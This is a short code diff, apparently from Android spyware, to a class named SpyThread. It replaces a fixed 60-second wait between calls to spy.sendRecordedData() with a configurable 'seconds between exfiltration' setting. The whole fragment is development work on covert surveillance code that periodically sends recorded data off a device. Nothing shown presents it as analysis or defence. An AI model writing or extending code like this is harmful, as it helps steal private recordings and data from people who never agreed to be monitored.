@@ -22,7 +22,7 @@ public class SpyThread extends Thread{
         Log.d("SpyThread", "Running...");
         try {
             while (true) {
-                Thread.sleep(60000);
+                Thread.sleep(ParametersConfig.getSecondsBetweenExfiltration()*1000);
                 spy.sendRecordedData();
             }
         } catch (InterruptedException e) {
